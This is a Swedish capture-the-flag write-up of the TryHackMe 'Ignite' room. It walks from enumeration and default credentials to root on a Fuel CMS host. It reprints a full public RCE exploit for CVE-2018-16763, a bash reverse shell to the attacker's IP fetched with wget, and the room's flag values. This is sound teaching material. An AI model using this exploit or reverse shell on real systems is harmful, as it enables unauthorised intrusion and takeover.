# Ignite (TryHackMe)

## Enumeration

### nmap-scan
```bash
nmap -sC -sV 10.112.170.188
```
Började med en nmap scan för portar, scripts och versioner.

Resultat
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to FUEL CMS
```
Hittade endast en öppen HTTP port.

### HTTP 
Hemsidan var en genomgång på hur man använder Fuel CMS. Versionen var 1.4. 

Sökte upp CVE för den versionen. Den var sårbar för SQL-Injektion och RCE.

Scrollade på sidan och jag hittade att det är en MySQL databas. Samt filvägen till database.php

![screenshot](images/ignitemysql.png)

Efter att jag scrollade lite längre ner så hittade jag URL till admin inloggningen med standard inloggning.
![screenshot](images/ignitedefaultcred.png)

Standard inloggningen var inte ändrad från admin/admin. Fick tillgång till /dashboard med admin access.
![screenshot](images/loggedin.png)

Härifrån provade jag att komma åt database.php men fick en 403 Forbidden. Detta innebär att det är HTTP som blockerar filen och inte filsystemet.

![screenshot](images/403.png)


Inne i /assets så kunde man ladda upp bilder. Jag tänkte prova om man kunde ladda upp ett php reverse shell men det gick inte att välja .php filer. I burp suite proxy så valde jag en vanlig bild och i min HTTP Request så ändrade jag filen till shell.php 

Det misslyckades däremot med ett felmeddelande.
![screenshot](images/failupload.png)

## Initial Access

Jag testade istället att använda mig av RCE sårbarheten.

Efter research hittade jag en publik exploit för CVE-2018-16763 som gav RCE mot Fuel CMS 1.4
```
# Exploit Title: Fuel CMS 1.4.1 - Remote Code Execution (3)
# Exploit Author: Padsala Trushal
# Date: 2021-11-03
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

#!/usr/bin/python3

import requests
from urllib.parse import quote
import argparse
import sys
from colorama import Fore, Style

def get_arguments():
	parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[0]} -u <url>',epilog=f'EXAMPLE - python3 {sys.argv[0]} -u http://10.10.21.74')

	parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

	parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

	args = parser.parse_args()

	if len(sys.argv) <=2:
		parser.print_usage()
		sys.exit()
	
	return args


args = get_arguments()
url = args.url 

if "http" not in url:
	sys.stderr.write("Enter vaild url")
	sys.exit()

try:
   r = requests.get(url)
   if r.status_code == 200:
       print(Style.BRIGHT+Fore.GREEN+"[+]Connecting..."+Style.RESET_ALL)


except requests.ConnectionError:
    print(Style.BRIGHT+Fore.RED+"Can't connect to url"+Style.RESET_ALL)
    sys.exit()

while True:
	cmd = input(Style.BRIGHT+Fore.YELLOW+"Enter Command $"+Style.RESET_ALL)
		
	main_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+quote(cmd)+"%27%29%2b%27"

	r = requests.get(main_url)

	#<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

	output = r.text.split('<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">')
	print(output[0])
	if cmd == "exit":
		break

```
Jag skapade rce.py med innehållet ovan. Sedan körde jag exploiten med python3
```bash
python3 rce.py -u http://10.112.170.188
```
Exploiten fungerade och resulterade i RCE på systemet.

![screenshot](images/exploit.png)

För att få stabilare åtkomst till systemet skapade jag en fil vid namn shell.sh innehållande ett bash reverse shell till min attackmaskin.

```bash
/bin/bash -i >& /dev/tcp/10.112.106.117/4444 0>&1
```

Sedan behövde jag starta en temporär http server med python för att hämta hem mitt shell till systemet.
```bash
python3 -m http.server
```
Jag startar en lyssnare på port 4444
```bash
nc -lvnp 4444
```

Med RCE så hämtar jag min shell.sh.
```bash
wget http://10.112.106.117:8000/shell.sh -O shell.sh
```
```bash
bash shell.sh
```
Jag körde sedan reverse shellet via bash.

Inuti min terminal där jag körde min lyssnare så använde jag whoami för att verifiera att jag fått tillgång.

![screenshot](images/whoami.png)

Detta gav ett begränsat shell utan TTY-funktionalitet, vilket gjorde att tab-completion och användning av piltangenterna inte fungerade. Jag ville uppgradera till ett interaktivt bash shell med TTY funktioner.

Steg 1.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
Steg 2.
```bash
export TERM=xterm
```
Steg 3. 
CTRL+Z För att sätta mitt shell i bakgrunden.

Steg 4. Detta kör jag i min egna terminal och fick då en terminal med ett interaktivt TTY-shell
```bash
stty raw -echo; fg
```

Inuti /home/www-data så hittade jag flag.txt
```
6470e394cbf6dab6a91682cc8585059b
```

## Privilege Escalation
Jag började med att köra sudo -l för att se mina sudo rättigheter men det misslyckades då det krävde www-datas lösenord.

```bash
find / -type f -perm -4000 2>/dev/null
```
Kollade sedan SUID binaries för att hitta vilka filer som körs som root.

```
/usr/sbin/pppd
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/vmware-user-suid-wrapper
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/passwd
/bin/su
/bin/ping6
/bin/ntfs-3g
/bin/ping
/bin/mount
/bin/umount
/bin/fusermount
```

Ingen av dessa SUID binaries gav någon uppenbar väg till privilege escalation.

Jag kunde tidigare inte komma åt database.php från hemsidan. Jag provar att gå till filvägen via mitt shell eftersom det indikerades att det endast var HTTP som blockerade tillgång till filen.

Jag kunde komma åt och läsa database.php.

Här ser vi inloggningen för root i klartext.

![screenshot](images/root.png)

Jag bytte sedan användare till root med su och använde lösenordet "mememe" sedan körde jag whoami.
```bash
su
```

```
mememe
```

![screenshot](images/rootaccess.png)

Inuti /root hittade jag root.txt

```
b9bbcb33e11b80be759c4e844862482d
```
## Förbättring 
* Bli bättre på att dokumentera och komma ihåg tidiga fynd under enumeration, då information som verkar irrelevant initialt kan bli värdefull senare i attackkedjan.
## Länk till rummet 
https://tryhackme.com/room/ignite
